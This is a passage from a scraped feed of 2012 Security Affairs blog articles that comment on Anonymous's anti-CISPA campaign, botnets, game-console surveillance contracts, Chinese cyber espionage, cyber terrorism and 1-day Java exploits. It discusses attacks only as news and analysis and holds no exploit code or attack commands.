Communications Headquarters) web page started to be re-directed down a level to:\n\nhttp://www.gchq.gov.uk/Pages/homepage.aspx\n\nAt about 18:40 GMT British Telecom , on whose servers this public website appears to be running, put a temporary 302 redirect to e.g.\n\nhttp://213.121.151.40/TPpRO/c3aba573/43de84c1/www.gchq.gov.uk/\n\ninstead of the previous IP address of http://195.171.165.115 which was advertised in the following recruiting messages of the group\n\n\n\n \n\nAt the beginning of article I had assumed that these operations could be the result of infiltration of the group, event that I believe possible in relation due the escalation promise by Anonymous against the major global companies. The Anonymous hacking collective has promised to bring down the website of Intel in protest at an anti-piracy bill that would permit the US government to strengthen security networks in the name of national security.\n\nDuring last week the collective has started the information campaign on internet promoting the DDoS attacks to propose in a first phase of the Operation called Defense. The Operation will be conduced against all those companies that support US policy involved in the support of the Cyber Intelligence Sharing and Protection Act.\n\nOne of illustrious victims of the phase I is the Boeing, and the group has announced that  the phase II will start in a couple of weeks. The element of innovation is that the protest this time will pass from internet also to the streets. A video published on YouTube says:\n\n\u201cAttacks will not be limited to Distributed Denial of Service attacks,\u201d \u201cPhase II will commence on May 1 and will include coordinated physical protests outside locations belonging to the corporations.\u201d\n\n30 private companies have supported Cispa (Cyber Intelligence Sharing and Protection Act), The bill would give the U.S. government additional options and resources to ensure the security of networks against attacks and enforce copyright and patents, this means that we will assist to a strict collaboration between businesses and government sharing cyber-security information.   Of course the line between monitoring and censorship is thin and many experts claim that the legislation contains also restraints on how and when the government may monitor private information, operating any kind of control he desires, even the shut down of source.\n\nThe list of companies and associations include top names like Intel, Boeing, Facebook, Microsoft, IBM, Edison Electric, Verizon Wireless, Symantec, AT&T and Comptel and the National Cable & Telecommunications Association. In order to prevent the theft of government sensible information and intellectual property the CISPA give to the institutions the ability to block suspected web sites, to monitor web traffic and this is consider a war act against privacy.\n\nGroups like anonymous are obviously contrary to a law so intrusive and are angered by the support offered to the government from private industry, so the collective has already attacked company like Boeing and US Telecom with Distributed Denial of Service (DDoS) assault by the collective. The real problem is that this type of attacks is being unuseful, the risk of addiction is high, Anonymous knows it.\n\nI believe that we must distinguish two phases of Anonymous phenomenon, the first one that I define \u201cHere I am, know me and learn to live with my judgment\u201d is the one we are leaving, in this phase the group He introduced himself to the world, showing their offensive capabilities but also a broad support enjoyed by. The second phase, named \u201cOpenness\u201d, is the one we will live in the next months, in this phase the group will tries to try to talk with institutions, will operate on internet but also in the street. The stage is very delicate because of the heterogeneous nature of the group, many hactivists will not accept the openness to institutions becoming active in a loose, loose cannons in the web that could stage striking and unethical attacks.\n\nThis is the worst scenario, the web may soon reign in the chaos and regulations such as the one under discussion certainly would not be able to govern.\n\nPierluigi Paganini\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/anonymous", "topic_name": "Anonymous"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cispa", "topic_name": "Cispa"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/content-filtering", "topic_name": "Content filtering"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber", "topic_name": "cyber"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-attacks", "topic_name": "Cyber attacks"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-crime", "topic_name": "Cyber Crime"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-threat", "topic_name": "cyber threat"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cybercrime", "topic_name": "Cybercrime"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyberwarfare", "topic_name": "cyberwarfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/ddos", "topic_name": "DDoS"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/distributed-denial-of-service", "topic_name": "Distributed Denial of Service"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/facebook", "topic_name": "Facebook"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hackers", "topic_name": "Hackers"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacktivism", "topic_name": "Hacktivism"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/intelligence", "topic_name": "Intelligence"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/internet", "topic_name": "Internet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/large-scale-infiltration", "topic_name": "Large scale infiltration"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/monitoring", "topic_name": "monitoring"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/optrialathome", "topic_name": "OpTrialAtHome"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/security-of-networks", "topic_name": "security of networks"}]}, {"news_name": "Botnets and cyber warfare, a dangerous combination", "news_link": "https://securityaffairs.co/wordpress/4241/cyber-crime/botnets-and-cyber-warfare-a-dangerous-combination.html", "title": "Botnets and cyber warfare, a dangerous combination\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "April 13, 2012", "body": "The US Government is very close to the theme of warfare being among the countries that invest more in the field. In a cyber security context we can enumerate a huge quantity of cyber threats that daily are designed and enhanced, a heterogeneous world and that includes many different options that could harm military and private sector causing serious damages.\n\nIn recent months is the increased concern on the development of botnets that are afflicting the areas critical for a country such as financial and military. White House Cybersecurity Coordinator Howard Schmidt has deep knowledge of the problem for this reason he\u2019s convening federal agencies, law enforcers and private companies to define a common strategy to deal with the threat.\n\nBehind the botnet we can find several type of actors such as cyber criminals, foreign governments and also hacktivist with different purposes like cyber espionage, financial frauds realizations arranging of operation of protest. The components of the botnets could be located everywhere in the world involving several countries, different social contexts and different laws and regulations, for this reason is quite difficult to arrange a unique front to face with the threat.\n\nDuring the McAfee Public Sector summit in Arlington, Va,  on April 11th, Schmidt declared:\n\n\u201cThere\u2019s been a lot of discussion about botnets\u2026trying to identify how many are out there, what they\u2019re doing, what they could do and what the impact could be. I\u2019ve asked my office to engage in a private-public partnership to enhance the nation\u2019s cybersecurity by fighting against bot networks,\u201d\n\n\u201cWe\u2019re teaming U.S. internet service providers, search engines, internet vendors, privacy rights advocates and groups and trade associations to tackle this on all fronts. We\u2019re working on developing best practices and an industry code of conduct within the next 90 days.\u201d\n\nThe group of work led by Schmidt is spending a sensible effort in the battle, working to reach the following four main goals:\n\nI agree with the approach of the U.S. government, I believe that the strategy defined and targets are consistent with an approach to the problem that has become indispensable. Essential is to get a snapshot of the current situation and to define method to measure of extent of spread of the threat.  The definition of a process of measuring and the defining of a set of indicators that can provide a status on the evolution of the threat are essential steps, however it is necessary that these parameters must be universally recognized. Another key to fighting the proliferation of botnets is able to increase the level of awareness of the threat in each sector while also providing the tools necessary to tackle the problem.\n\n\n\n\nAs repeatedly stressed there is no clear line between cybercrime and warfare, botnets are a serious threat from the deadly offensive potential. Through the establishment of a botnet is possible to attack the nerve centers of a country, isolate attacks can target its critical infrastructures, create serious problems in areas like finance, communications and transport. That is cyber warfare, no matter if behind the attack there is a foreign government or ruthless criminals, the risk is high and face the threat has high priority.\n\n\u201cWe\u2019re looking at what [botnets] might do to a business\u2019s infrastructure, to personally identifiable information \u2013 identity theft, credit card fraud, et cetera \u2013 but it goes beyond that. What we\u2019re beginning to see is about 4 million new botnet infections every month\u2026it\u2019s a moving target,\u201d\n\nSchmidt said.\n\nWhat most worries the U.S. government is the high rate of spread of malware in the private sector, not easy to contrast the phenomenon. That it has-been estimated one in ten Americans has some kind of malicious software on Their devices.  To aggravate the scenario is the rapid spread of mobile industry in my opinion one of the most vulnerable in security. To an impressive growth in the demand is not corresponded the awareness of the threat, the user ignores most of the time the potential of its smartphone and threats which it is exposed.\n\nTo remain in topic a mobile botnet is a botnet that targets mobile devices such as smartphones, attempting to gain complete control of the mobile. Mobile botnets take advantage of unpatched exploits to provide hackers with root permissions over the compromised mobile device, enabling hackers to send e-mail or text messages, make phone calls, spy on users, access contacts and photos, and more.\nThe main problem is that botnets go undetected and this make really difficult to tackle.  The malware spread them self sending the agents to other devices via e-mail messages or text messages.\n\nExamples of mobile botnets are DreamDroid and TigerBot (SMS Controlled Android Malware) malware that compromised Google Android devices, Zitmo (zeus varian) that targeted Blackberry platform and CommWarrior which affected Symbian devices. The last in order of time is TigerBot, a new form of Android malware controlled via SMS messages that can record phone calls, upload the device\u2019s GPS location, and reboot the phone, among other operations executable in the command preventing the message from being seen by the user. TigerBot tries to hide itself from the user by not showing any icon on the home screen and by using legitimate sounding app names (like System) or by copying names from trusted vendors like Google or Adobe. \u201cTigerBot\u201d, differs from \u201ctraditional\u201d malware in that it is controlled via SMS rather than from a command & control (C&C) server on the Internet. The polymorphism of the threats and the genesis of new variants are the issues that most concern, these hacks and malware would essentially turn the phones into \u201czombies\u201d in order to respond to external orders.\n\nAccording to Schmidt it is necessary to act immediately, let me conclude with a meaningful affirmation the he said:\n\n\u201cOne of the clear issues we won\u2019t be doing anymore is to just sit back and admire the problem. We\u2019ve done that for too long.

This is the next step of the warfare, spy and attacks foreign enemy simply accessing to the devices that are presents in their offices, in their houses and in their cars.\nEvery device connected to internet could be target of a possible attack, the intelligence which is fitted can be used for numerous purposes, exploiting the lack of awareness in the cyber threat. They exchange information, talk to each other sometimes getting rid of many concerns and facilitating our daily lives, the issue is extremely delicate and deserves careful study, these devices that can provide any information on our experience, can be controlled remotely to spy on us, even worse may be deliberately tampered with remotely to cause damage.\n\nFor this reason, the American cyber strategy has addressed a sensitive component of his researches in this area with the intent to qualify in detail the threat trying to benefit from his knowledge and its intended use. The U.S. government recently promoted a project to hack into video game consoles requesting for the \u201cDevelopment of Tools for Extracting Information from Video Game Systems.\u201d\n\nThe idea is simple as efficient, today consoles are totally equivalent to a computer, they are connected to internet in the same way and they provide many services to the final customer. Last generation of gaming console have pushed on the communication aspect, using the devices the users are able to communicate to every other player connected to the gaming platform, well those communication and any other sensible information stored in the console are object of interest of US intelligence agencies.\n\nThe U.S. Navy has reported that scope of the project is to hack into used consoles to access to any sensitive information exchanged through their messaging services, it has also guarantee that the spying technology will be used only on nations overseas due the internal law restrictions that don\u2019t allow this practices on US citizens.\n\nThe official U.S. Navy statement is:\n\n\u201cThis project involves furnishing video game systems, both new and used, and creating prototype rigs for capturing data from the video game systems.\u201d\n\nThe description from the actual contract from the Federal Business Opportunities website, posted on March 26 is:\n\n\u201cR & D effort for the development and delivery of computer forensic tools for analyzing network traffic and stored data created during the use of video game systems.\u201d\n\nThe project has been published two months ago and week the U.S. Government has assigned it to the California-based company Obscure Technologies, signing a contract of $177,237.50 for the job. Obscure Technologies was chosen due its considerable experience in the sector and because \u201cis the only US company that appears to offer the purchasing of used computer equipment for access to the contained information as a commercial service,\u201d according to the Contracting Activity document (docx).\n\nUS agencies are more interested on the platforms rather than the games, mainly because newer consoles allow users to communicate with one another via messaging and chat systems.\n\nThe main requirements of the project are:\n\nOnline Monitoring Tasks:\n\nOffline Monitoring tasks:\n\nIn the past many studies were conducted on the use of gaming consoles from the producers and also by many organizations interested in psychological research.\nThis time the approach is quite different, there is the clear intent to spy on users that access to gaming platform.\n\nSimilar project have already developed in the past, in 2008, a project called \u201cGaming Systems Monitoring and Analysis Project\u201d was launched by law enforcement to investigate on crime relating to pedophilia.\nFor that project law enforcement authorities requested help to DHS\u2019 Science and Technology Directorate asking for an instrument that could observe game console data. DHS then went to the Naval Postgraduate School (NPS) to find Simson Garfinkel, a NPS computer science professor, to offer a contract to a company that could conduct the research and offer a product.\n\n\u201cToday\u2019s gaming systems are increasingly being used by criminals as a primary tool in exploiting children and, as a result, are being recovered by U.S. law enforcement organizations during court-authorized searches,\u201d said Garfinkel.\n\nObviously there have been many concerns about the project and its legality, the Electronic Freedom Foundation (EFF) spokesman Parker Higgins has alerted the world wide community regarding the illegality of the access to sensitive information stored on a console without that the storage has been specifically requested by the user.\nThe main problem is\n\u201cWhich are the sensitive information that consoles keep without explicit information authorization of the users?\u201d\n\nParker Higgins said:\n\n\u201cYou wouldn\u2019t intentionally store sensitive data on a console,\u201d\n\u201cBut I can think of things like connection logs and conversation logs that are incidentally stored data. And it\u2019s even more alarming because users might not know that the data is created. These consoles are being used as general-purpose computers. And they\u2019re used for all kinds of communications. The Xbox has a very active online community where people communicate. It stands to reason that you could get sensitive and private information stored on the console.\u201d\n\nThe interest of US government in the gaming sector is not only motivated by spy intent, the same consoles can be used as a weapon in a cyber attack. Imagine a botnet made \u200b\u200bup of millions of consoles at the same time throw an attack against a strategic target, but is not science fiction, it is reality. Similar attacks may cause extensive damage in a scenario of warfare and the U.S. government is aware of it.\nUnderstand and address the issues related to the new generation of cyber weapon is crucial and a misuse of the console may be used in this perspective.\nThe gaming market is one of the most critical in terms of security for the following reasons:\n\nA study conducted about one year ago showed that 80% of organizations that provide gaming services not keep track of those who use game consoles in the workplace, thus making impossible to trace the activities related to the possible source of attack. After Sony Event, something is changed. According to the main security firm safety of users playing online console is exposed to significant risks more or less serious.\n\nthe war is just began \u2026\n\nPierluigi Paganini\n\n(Security Affairs \u2013 Gaming security)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/botnet", "topic_name": "botnet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/console", "topic_name": "console"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber", "topic_name": "cyber"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-attack", "topic_name": "cyber attack"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-attacks", "topic_name": "Cyber attacks"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-intelligence", "topic_name": "cyber intelligence"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-strategy", "topic_name": "cyber strategy"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-threat", "topic_name": "cyber threat"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-weapon", "topic_name": "cyber weapon"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cybercrime", "topic_name": "Cybercrime"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/espionage", "topic_name": "Espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/gaming-platforms", "topic_name": "gaming platforms"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/gaming-sector", "topic_name": "gaming sector"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hack", "topic_name": "hack"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hackers", "topic_name": "Hackers"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacktivism", "topic_name": "Hacktivism"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacktivist", "topic_name": "hacktivist"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/incident", "topic_name": "Incident"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/intelligence", "topic_name": "Intelligence"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/large-scale-infiltration", "topic_name": "Large scale infiltration"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/mobile", "topic_name": "mobile"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/spy", "topic_name": "spy"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/u-s-navy", "topic_name": "U.S. Navy"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/us", "topic_name": "US"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/video-game", "topic_name": "Video Game"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/warfare", "topic_name": "warfare"}]}, {"news_name": "China, cyber warfare and challenges for the future", "news_link": "https://securityaffairs.co/wordpress/4044/intelligence/china-cyber-warfare-and-challenges-for-the-future.html", "title": "China, cyber warfare and challenges for the future\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "April 9, 2012", "body": "When discuss on cyber warfare we cannot regardless of the role played by nations such as China, U.S. and Russia. In particular, the Beijing government has distinguished itself in recent years for two key aspects:\n\nThe second aspect is crucial and strongly correlated to the first, in recent years the technology push of the Asian country was disarming and it\u2019s one of the principal reason for its success. Despite the situation inside the country presented considerable economic hardship in rural areas the central government has invested and encouraged private companies to invest in various capacities for develop and acquire technological know-how.\n\nAs I said the two aspects are highly correlated, China through private companies and groups of sponsored hackers have promoted several operations with the purpose of acquiring sensitive information on foreign technology projects, in more than one occasion has been conducting cyber espionage against companies and governments of other nations. An aggressive strategy that has not spared anyone, sometimes with devastating consequences for victims, as in the case of Nortel ended up in bankruptcy.\nI would introduce the concept of strategy of espionage, concerted actions planned with meticulous attention against strategic objectives, innovative techniques of espionage that have introduced a massive use of malware to infect systems to spy on, the use of operations as a diversionary attacks DDoS to conceal other operations, the choice of auxiliary vulnerable targets such as contractors to access data from governments and government agencies.\n\nChina have done and is doing everything is possible to be independent from other countries like US and Japan for critical technologies, the espionage is just the dark side of the effort spent. The 2006 Medium to Long Term Plan on Science and Technology (MLP) announced\n\n\u201cFacts have proved that, in areas critical to the national economy and security, core technologies cannot be purchased.\u201d\n\nThere is strong commitment to develop inside the country sensible technology to not give any kind of advantage to foreign industries. Let\u2019s consider another crucial factor, the relative low cost of manufacturing in China has attracted several foreign companies and their production in the country giving to the nation a great advantage. In my opinion once the production is decentralized in other countries is utopic to try to maintain any secret.\nReduce costs is essential for a globalized business but is could be an high risk, a thriving business today could be transformed in future disaster due production secret exposure.\n\nThe MLP sets the goal of China becoming an \u201cinnovative nation\u201d by 2020 and a \u201cglobal scientific power\u201d by 2050, the objectives are really ambitious but feasible in my opinion.\n\nLooking into the future projection which scenario we should expect?\n\nChina\u2019s growth in terms of technology and strengthening its presence in cyber space will no doubt to the increase in cyber operations against the nation itself. Many industry experts believe that due to imbalance between a cyber offence strategy so aggressive and its cyber defense policy could not be origin of significant technological problems for China.\n\nChina over the years has benefited from a surprise effect due to the lack of government information on cyber security and a lack of awareness of the cyber threats. Today the scenario has changed profoundly, every nation is striving for the establishment of a cyber appropriate strategy that can guarantee the security of the nation in terms of technology. In this context, offend and spying is certainly more complex than in the past and then what I think is the China will improve its defensive capabilities to preserve the knowledge acquired through years of hard work, research and espionage.\n\n\n\nThe rise of China and its consolidation may be hampered by a range of phenomena that I try to summarize in the following list:\n\nThese four components are the real challenge for the future of a country that has grown like no other \u2026\n\n\nIs China really ready?\n\nPierluigi Paganini\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/anonymous", "topic_name": "Anonymous"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/censorship", "topic_name": "Censorship"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/china", "topic_name": "China"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-attacks", "topic_name": "Cyber attacks"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-crime", "topic_name": "Cyber Crime"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-security", "topic_name": "cyber security"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-strategy", "topic_name": "cyber strategy"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-threats", "topic_name": "cyber threats"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-warfare", "topic_name": "cyber warfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/ddos", "topic_name": "DDoS"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/espionage", "topic_name": "Espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hackers", "topic_name": "Hackers"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacktivism", "topic_name": "Hacktivism"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacktivist", "topic_name": "hacktivist"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/intelligence", "topic_name": "Intelligence"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/large-scale-infiltration", "topic_name": "Large scale infiltration"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/sponsored-hackers", "topic_name": "sponsored hackers"}]}, {"news_name": "Synaptic Labs\u2019 Annual Reports on the Global Cyber Safety and Security Status, Technical Problems, Drivers and Incentives (2012)", "news_link": "https://securityaffairs.co/wordpress/4054/cyber-crime/synaptic-labs-annual-reports-on-the-global-cyber-safety-and-security-status-technical-problems-drivers-and-incentives-2012.html", "title": "Synaptic Labs\u2019 Annual Reports on the Global Cyber Safety and Security Status, Technical Problems, Drivers and Incentives (2012)\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "April 9, 2012", "body": " \n\n", "topics": ""}, {"news_name": "Cyber terrorism, cyber attacks against al Qaeda 2.0", "news_link": "https://securityaffairs.co/wordpress/3986/cyber-crime/cyber-terrorism-cyber-attacks-against-al-qaeda-2-0.html", "title": "Cyber terrorism, cyber attacks against al Qaeda 2.0\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "April 6, 2012", "body": "The encounter with terrorism technology, widely defined cyber terrorism, is one of the main threats for each country. Wrongly, we tend to associate a terrorist act to a physical event as an explosion, a conflict, a tragedy, but the common people totally ignore the potential threat of a cyber offensive.\n\nWe learned about the devastating effects of a cyberweapon, ie tools capable of attacking critical infrastructures with devastating consequences. Think of a virus as Stuxnet that may affect the proper functioning of control systems of a nuclear power plant, could be a catastrophic accident. Not least would be a incident to a control systems of a dam and we can find hundreds of similar analogies.\nA terrorist could have clear advantages in conducting such an operation, primarily the ability to remain anonymous and silent in time.\n\nSecond error made when one thinks of a terrorist attack is thought the attack in to consider it in the final phase, one linked to the damage, striking and destructive event. A cyber attack requires meticulous preparation, the step of gathering information on the target is crucial and cyber tools and malware are excellent for conducting this phase. Today there are countless exploits to help gain control of remote PCs, these options would certainly facilitate the preparation of a terrorist act. Through emails and documents of a pc it\u2019s possible to trace a profile of an objective, reconstruct its history, deepening vulnerabilities, clear that we are faced with a threat as dangerous as the event itself because the same information could be used for subsequent attacks.\n\nA a secret report issued December 21 by the Canadian Office of Critical Infrastructure Protection and Emergency Services raises the specter of a possible future cyber attack by agents or sympathizers of Osama bin Laden\u2019s al Qaeda terrorist organization. Although to date there is no proof of the al Qaeda\u2019s interest in a cyber offensive the possibility of conducting a cyber attack is high considering the huge financial resources of the group to purchase the equipment required and to acquire the needed expertise.\n\n\u201cBin Laden\u2019s vast financial resources, however, would enable him or his organization to purchase the equipment and expertise required for a cyber attack and mount such an attack in very short order.\u201d\n\n\n\n\nIn one of its interviews bin Laden has spoken regarding the possible constitution of a cyber army.\n\n\u201chundreds of Muslim scientists were with him who would use their knowledge \u2026 ranging from computers to electronics against the infidels,\u201d\n\naccording to the Canadian report bin Laden may have planned a cyber attacks against the West.\n\n\n\nOf course we have to aspect similar attacks coming from all over the world organized by sympathizers in other countries having as possible targets such as telecommunications grid, electric power facilities and oil and natural gas pipelines.\n\nYesterday Al-Qaeda\u2019s main internet forums have been attacked, they were offline for during the entire day, several others sites were downed during last weeks including two of the terrorist organization\u2019s top sites, al-Fida and Shamukh al-Islam.  At the moment there are no claims but the nature of the attacks suggests the intervention of groups of hackers hired by governments committed to the fight against terrorism.\n\nSome rumors cite that the managers of the web sites intentionally stopped their services because they noticed the infiltration of foreign spies, this occurrence in my opinion is absurd.\n\nPersonally I think such attacks aren\u2019t very useful, even counterproductive, for several reasons, first of all events like these will induce the activists of Al-Qaeda to increase security measures to protect their computer resources making it difficult cyber espionage operations and infiltration.\n\nAnother negative aspect related to the attacks is that they could call for similar reactions bringing the level of attention of the group on cyber weapons to worrying levels.\n\nAs stated by these terrorists have substantial financial resources and industry of cybercrime would be happy to forge new alliances in the name of the business. In this way we can induce the genesis of a new and unpredictable cyber threats from which defend themselves would be complicated.\n\nPierluigi Paganini\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/al-qaeda", "topic_name": "Al-Qaeda"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/critical-infrastructures", "topic_name": "Critical infrastructures"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber", "topic_name": "cyber"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-attacks", "topic_name": "Cyber attacks"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-crime", "topic_name": "Cyber Crime"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-offensive", "topic_name": "cyber offensive"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-terrorism", "topic_name": "cyber terrorism"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-threat", "topic_name": "cyber threat"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-threats", "topic_name": "cyber threats"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-weapon", "topic_name": "cyber weapon"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cybercrime", "topic_name": "Cybercrime"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyberweapon", "topic_name": "cyberweapon"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/espionage", "topic_name": "Espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/exploits", "topic_name": "exploits"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hackers", "topic_name": "Hackers"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/incident", "topic_name": "Incident"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/intelligence", "topic_name": "Intelligence"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/stuxnet", "topic_name": "stuxnet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/trojan", "topic_name": "Trojan"}]}, {"news_name": "1-day exploits,Binary Diffing & patch management.The side threats", "news_link": "https://securityaffairs.co/wordpress/3913/cyber-crime/1-day-exploitsbinary-diffing-patch-management-the-side-threats.html", "title": "1-day exploits,Binary Diffing & patch management.The side threats\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "April 4, 2012", "body": "Recently ESET security firm has reported the latest version of the Blackhole exploit kit that has been updated to include a new exploit for the Java CVE-2012-0507 vulnerability.  The exploit was discovered for the first time on 7.03.2012 and it first detections were dated on March 12, 2012 and today a public module for Metasploit Framework multi platforms has been released for exploitation of CVE-2012-0507.\n\nI have opened the article with this information to introduce a really interesting topic, the 1-day exploit, exploits based on checking patched versions of software to identify what the vulnerabilities that have been patched actually are. The concept is quite simple, simply analizing the patch management status of a system it possible to know with vulnerability haven\u2019t yet patched. exploiting these vulnerabilities it is possible to attack an unpatched system.\n\nOf course compared to a 0-day vulnerabilities we have reduced possibility of success due the correct patching of a target but this attacks are really insidious and cheaper respect the 0Days. Consider also that for this vulnerabilities is quite simple to retrieve on internet information and tool to make an attacks.\n\nIn the most complex case we can imagine a research that through a revers engineering of a released patch develop its own kit to a attack unpatched target.\n\nThe majority of this exploits are related today to Java vulnerabilities also due its large diffusion on multiplatform sistems. Jave exploits are in fact an effective way to inslall malicious programs on target machine, consider the recent spam campaign that have infected a huge quantity of machine or the incredible number of infected web sites that allow this kind of attacks. The mechanism is simple, a legitimate web site is infected introducing iFrames that redirect victims to the latest version of Blackhole. The malicious domain name and infected webpage are identical to the legitimate one. Once on the infected website the damage is done!\n\nAccording Eset same infection method and the same redirection methods have been used several times, famous the case of the popular news resource izvestia.ru where a modified versions of the Win32/TrojanDownloader.Carberp family were loaded onto the victim machines.\n\nJava vulnerabilities and in particular every 1-day exploits is increasing used by cyber crime and state sponsored a hackers.\n\n\u201cThis is the most effective way for exploiting end-user systems and is sometimes effective across a variety of platforms,\u201d writes ESET. Consider that the development of a 0-days is really expensive and time-consuming due the intense research that must be conduced to discovery and exploit the vulnerabilities, for this reasons typically this kind of exploit are used by governments.\n\n \n\n\n\nCybercrime has mass market approach that not necessary needs a so sophisticated attack methodology, that\u2019s why the 1-day exploit approach is taking place.  To give an idea of a typical patching process I have designed the following chart, its duration is highly variable depending on the structure of the organization that implement the procedures and the duration of each stage components.\n\nIt\u2019s clear that few organizations are able to patch their systems in a short time. Consider large organizzation with complex architectures, for them the impact of a patch must be analyzed in detail to avoid problems to IT infrastructure, then this case in is necessary to extend the duration of the test phase.\n\nAlso the phase of deployment can have variable length, for example in a company located over multiple locations with a high number of systems to patch and strongly heterogeneous. the deployment activities will be more expensive.  It \u2018easy to understand that the time between the disclosure of Partch and its application in a production environment is the interval in which systems are vulnerable to 1-Day vulnerabilities.\n\nESET has demonstrated how quickly the Blackhole gang can react to the 1-day opportunity.\n\n\u201cThere\u2019s intense interest in vulnerability research, with legitimate research seized upon by malware authors for malicious purposes,\u201d\n\nDavid Harley, a senior research fellow and co-author of this research told Infosecurity:\n\n\u201cThe increase in volumes of 1-day exploits suggests that even if 0-days research prices itself out of the mass market for exploits, inadequate update/patch take-up among users is leaving plenty of room for exploits of already-patched vulnerabilities (as with the current spate of Tibet attacks).\u201d\n\nJust few minutes after the release of patches, using binary diffing techniques researchers and criminals are able to identify the vulnerabilities that the have been fixed. The term diff derive from the name of the command utility used for a comparison of files, in the same 